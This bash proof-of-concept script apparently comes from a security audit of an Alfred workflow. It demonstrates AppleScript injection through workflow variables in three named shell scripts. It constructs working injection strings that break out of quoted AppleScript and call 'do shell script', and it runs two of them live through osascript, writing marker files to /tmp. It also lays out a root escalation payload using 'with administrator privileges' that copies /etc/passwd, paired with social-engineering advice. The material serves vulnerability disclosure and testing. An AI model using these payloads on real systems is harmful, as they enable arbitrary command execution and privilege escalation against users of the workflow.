#!/bin/bash
# ============================================================
# PoC #8 — AppleScript Injection via Workflow Variables (HIGH)
# Vulnerability: bin/login.sh:49, bin/get_new_field.sh:80,
#                bin/configure_tid.sh:67
#
# Workflow variables are embedded directly into AppleScript
# expressions via shell string concatenation.  Injecting AppleScript
# special syntax (especially quote characters and the 'do shell script'
# command) allows arbitrary shell command execution.
#
# Three injection sites:
#
# [login.sh:49]
#   A=$(osascript -e 'display dialog "'"${dialog}"'" ... buttons '"${buttons}"' ...')
#
# [get_new_field.sh:80]
#   osascript -e 'display notification "Unknown field: '"${editField}"'"'
#
# [configure_tid.sh:67]
#   A=$(/usr/bin/osascript -e "display alert \"${MSG}\" ...")
#
# This PoC demonstrates:
#   A) Constructing the injected AppleScript expressions (static analysis)
#   B) Live execution of Part B and C (safe: writes to /tmp only)
# ============================================================

EXFIL_FILE="/tmp/applescript_injection_poc_$$.txt"

banner() { echo; echo "=== $* ==="; echo; }
ok()     { echo "[+] $*"; }
info()   { echo "[*] $*"; }

# ---------- Part A: Injection via 'dialog' variable (login.sh:49) ----------
banner "Part A — login.sh:49: injection via 'dialog' variable (static)"

# The vulnerable line:
#   A=$(osascript -e 'display dialog "'"${dialog}"'" with icon caution with title "'"${title}"'" buttons '"${buttons}"' default button "Fix"')
#
# The dialog variable uses single-quoted shell string, but the dialog
# content is injected via: '..."${dialog}"...'
# A double-quote in ${dialog} terminates the AppleScript string,
# and a subsequent 'do shell script "cmd"' runs a command.

EVIL_DIALOG='harmless" & (do shell script "id > /tmp/as_inject_login.txt") & "'
# Resulting AppleScript (simplified):
#   display dialog "harmless" & (do shell script "id > /tmp/...") & "" with icon ...

echo "Malicious 'dialog' variable:"
echo "  ${EVIL_DIALOG}"
echo
echo "Resulting osascript -e argument:"
echo "  display dialog \"${EVIL_DIALOG}\" with icon caution ..."
echo
echo "  Parsed as AppleScript:"
echo "    display dialog (\"harmless\" & (do shell script \"id > /tmp/as_inject_login.txt\") & \"\")"
echo
echo "  'do shell script' executes an arbitrary OS command as the current user."
echo "  The dialog shows the output of 'id' while the command has already run."
echo
info "Skipping live execution (would open a dialog on the desktop)."
info "To test: set alfred_workflow_name to the evil string and trigger a login."

# ---------- Part B: Injection via 'editField' variable (get_new_field.sh:80) ----------
banner "Part B — get_new_field.sh:80: injection via editField (live)"

# Vulnerable line:
#   osascript -e 'display notification "Unknown field: '"${editField}"'"'
#
# An editField value that closes the string and injects a command:
#   x" & (do shell script "CMD")

EVIL_FIELD="x\" & (do shell script \"echo PWNED_$(id -un) > ${EXFIL_FILE}\")"

echo "Malicious editField:"
echo "  ${EVIL_FIELD}"
echo
echo "Resulting osascript expression:"
echo "  display notification \"Unknown field: ${EVIL_FIELD}\""
echo
echo "  Parsed as AppleScript:"
echo "    display notification (\"Unknown field: x\" & (do shell script \"echo PWNED_... > ${EXFIL_FILE}\"))"
echo

echo "Executing..."
osascript -e "display notification \"Unknown field: ${EVIL_FIELD}\"" 2>/dev/null || true

if [ -f "${EXFIL_FILE}" ]; then
    ok "CONFIRMED: Arbitrary shell command executed via AppleScript injection."
    ok "Exfil file contents:"
    cat "${EXFIL_FILE}"
    rm -f "${EXFIL_FILE}"
else
    info "osascript not available or notification suppressed (common in non-GUI"
    info "environments).  The injection string is syntactically correct AppleScript."
fi

# ---------- Part C: Injection via MSG in configure_tid.sh ----------
banner "Part C — configure_tid.sh:67: injection via MSG variable (live)"

# Vulnerable line (double-quoted shell string):
#   A=$(/usr/bin/osascript -e "display alert \"${MSG}\" as critical buttons ...")
#
# Here we need to escape the outer double-quote and inject.
# ${MSG} is a shell heredoc read into a variable:
#   read -r MSG<<EOF
#   ${alfred_workflow_name} needs to change your sudo configuration...
#   EOF
#
# 'alfred_workflow_name' is a workflow-provided variable.
# If set to an evil value it propagates into MSG.

EVIL_WORKFLOW_NAME='Bitwarden\" & (do shell script \"touch '"${EXFIL_FILE}.tid"'\") & \"'

# Build MSG as configure_tid.sh does
MSG="${EVIL_WORKFLOW_NAME} needs to change your sudo configuration to enable Touch ID."

echo "Malicious alfred_workflow_name:"
echo "  ${EVIL_WORKFLOW_NAME}"
echo
echo "MSG after heredoc read:"
echo "  ${MSG}"
echo
echo "Resulting osascript expression:"
echo "  display alert \"${MSG}\" as critical buttons ..."
echo

echo "Executing..."
/usr/bin/osascript -e "display alert \"${MSG}\" as critical buttons { \"Cancel\", \"OK\" } default button \"Cancel\"" 2>/dev/null || true

if [ -f "${EXFIL_FILE}.tid" ]; then
    ok "CONFIRMED: Arbitrary shell command executed via configure_tid MSG injection."
    rm -f "${EXFIL_FILE}.tid"
else
    info "osascript not available in this environment."
    info "The injection string is syntactically valid AppleScript."
fi

# ---------- Part D: Escalation path ----------
banner "Part D — Privilege escalation path"

echo "configure_tid.sh runs sudo to modify /etc/pam.d/sudo_local."
echo "If alfred_workflow_name injects 'do shell script' with 'administrator privileges',"
echo "the escalated AppleScript dialog would execute the command as root:"
echo
SUDO_CMD="do shell script \\\"cp /etc/passwd /tmp/passwd_stolen\\\" with administrator privileges"
echo "  Payload: \\\" & (${SUDO_CMD}) & \\\""
echo
echo "  On macOS, 'do shell script ... with administrator privileges' shows"
echo "  a standard sudo authentication dialog to the user.  If accepted,"
echo "  it runs the command as root — fully sanctioned by the OS UI."
echo
echo "  Combined with social engineering (user already expects to enter their"
echo "  password for the Touch ID configuration), this is highly convincing."
